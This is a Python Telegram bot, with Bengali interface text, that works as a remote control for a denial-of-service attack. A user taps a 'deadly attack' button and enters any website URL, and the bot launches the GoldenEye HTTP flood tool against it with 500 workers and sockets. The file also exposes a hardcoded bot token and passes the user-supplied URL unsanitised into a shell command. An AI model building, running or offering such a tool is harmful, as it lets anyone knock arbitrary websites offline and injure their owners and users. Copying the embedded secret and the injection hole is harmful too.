import telebot
from telebot import types
import subprocess
import os
import signal
import time
from keep_alive import keep_alive

# আপনার টেলিগ্রাম বট টোকেন এখানে দিন
API_TOKEN = '8110390076:AAHgtbETfwzc701TANptZ4TyzU4ISmAIS0E'
bot = telebot.TeleBot(API_TOKEN)

active_attacks = {}

# স্বাগতম মেসেজ ও কাস্টম বাটন মেনু
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("🚀 ১নং বট: মরণঘাতী অ্যাটাক")
    btn2 = types.KeyboardButton("🛑 অ্যাটাক বন্ধ করুন")
    markup.add(btn1, btn2)
    
    welcome_msg = (
        "🔥 **স্বাগতম! আমি বট ১ (Extreme Flood)**\n\n"
        "আমি আপনার সিস্টেমের সবচেয়ে শক্তিশালী ইউনিট। "
        "নিচের বাটন ব্যবহার করে মরণঘাতী অ্যাটাক শুরু করুন।"
    )
    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "🚀 ১নং বট: মরণঘাতী অ্যাটাক")
def ask_url(message):
    msg = bot.send_message(message.chat.id, "🔗 টার্গেট সাইটের লিংক দিন (https://...):")
    bot.register_next_step_handler(msg, start_attack_process)

def start_attack_process(message):
    url = message.text
    chat_id = message.chat.id
    
    bot.send_message(chat_id, f"🌋 **১নং বট থেকে অ্যাটাক শুরু হয়েছে!**\n🎯 টার্গেট: {url}\n💪 পাওয়ার: ৫০০০+ রেন্ডম হেডার\n⚡ স্ট্যাটাস: (0 Failed)")

    # Render সার্ভার থেকে GoldenEye রান করা
    process = subprocess.Popen(
        f"python3 goldeneye.py {url} -w 500 -s 500 -m random", 
        shell=True, preexec_fn=os.setsid
    )
    active_attacks[chat_id] = process

@bot.message_handler(func=lambda message: message.text == "🛑 অ্যাটাক বন্ধ করুন")
def stop_attack(message):
    if message.chat.id in active_attacks:
        os.killpg(os.getpgid(active_attacks[message.chat.id].pid), signal.SIGTERM)
        del active_attacks[message.chat.id]
        bot.send_message(message.chat.id, "✅ অ্যাটাক সফলভাবে বন্ধ করা হয়েছে।")
    else:
        bot.send_message(message.chat.id, "বর্তমানে কোনো অ্যাটাক চলছে না।")

# Keep Alive চালু করা এবং বট পোলিং
keep_alive()
bot.polling(none_stop=True)
